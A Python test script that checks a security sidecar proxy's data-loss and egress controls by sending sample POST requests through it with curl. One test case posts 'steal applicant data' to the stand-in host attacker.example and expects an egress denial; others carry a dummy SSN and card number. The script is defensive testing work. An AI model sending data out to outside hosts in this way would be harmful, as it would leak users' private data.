#!/usr/bin/env python3
"""
Mode-2 tls-origination probe (deterministic, no LLM key needed).

Sends PLAINTEXT http requests THROUGH the sidecar as a forward proxy (absolute-URI
request line, exactly like `curl -x`). The sidecar reads the body, inspects it
(PII/secret block inline + EthicalZen semantic async), and originates TLS to the
real upstream. Proves:
  • clean body  → forwarded (real upstream response over originated TLS)
  • PII/secret  → blocked at the sidecar (403, never leaves)
  • non-allow-listed host → egress denied (403)

  python scenarios/tls_origination_probe.py                 # proxy localhost:15001
  python scenarios/tls_origination_probe.py --host localhost --port 15001 --json out.json
"""
import argparse, json, subprocess, sys

MATRIX = [
    ("clean → TLS-originated",     "http://api.equifax.com/", "applicant APP-10231 income 85000", "reach"),
    ("SSN → content block",        "http://api.equifax.com/", "applicant SSN 123-45-6789",        "content-block"),
    ("credit-card → content block","http://api.equifax.com/", "card 4242 4242 4242 4242",         "content-block"),
    ("exfil host → egress deny",   "http://attacker.example/x","steal applicant data",            "egress-deny"),
]

def post(proxy_host, proxy_port, target_url, body):
    # curl forward-proxy (absolute-URI), the proven mechanism for this sidecar.
    out = subprocess.run(
        ["curl", "-sS", "-m", "25", "--proxy", f"http://{proxy_host}:{proxy_port}",
         "-X", "POST", target_url, "-d", body, "-w", "\n__STATUS__%{http_code}"],
        capture_output=True, text=True)
    raw = (out.stdout or "") + (out.stderr or "")
    status = 0
    if "__STATUS__" in raw:
        body_part, _, code = raw.rpartition("__STATUS__")
        raw = body_part
        try:
            status = int(code.strip())
        except ValueError:
            status = 0
    return status, raw


def classify(status, body):
    if status == 403 and "blocked_by_soe" in body:
        return "content-block"
    if status == 403 and "egress_denied" in body:
        return "egress-deny"
    if status and "blocked_by_soe" not in body and "egress_denied" not in body:
        return "reach"
    return f"error({status})"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="localhost")
    ap.add_argument("--port", type=int, default=15001)
    ap.add_argument("--json", default="")
    a = ap.parse_args()
    print(f"\n=== Mode 2 tls-origination probe (proxy {a.host}:{a.port}) ===")
    print("plaintext in → sidecar inspects → originates TLS upstream\n")
    rows, passed = [], 0
    for label, url, body, expect in MATRIX:
        status, resp = post(a.host, a.port, url, body)
        got = classify(status, resp)
        ok = (got == expect)
        passed += 1 if ok else 0
        print(f"  [{'PASS' if ok else 'FAIL'}] {label:30s} expect={expect:14s} got={got:14s} (HTTP {status})")
        rows.append({"label": label, "expect": expect, "got": got, "status": status, "pass": ok})
    print(f"\n=== {passed}/{len(MATRIX)} correct ===")
    if a.json:
        json.dump({"passed": passed, "total": len(MATRIX), "rows": rows}, open(a.json, "w"), indent=2)
    sys.exit(0 if passed == len(MATRIX) else 1)


if __name__ == "__main__":
    main()
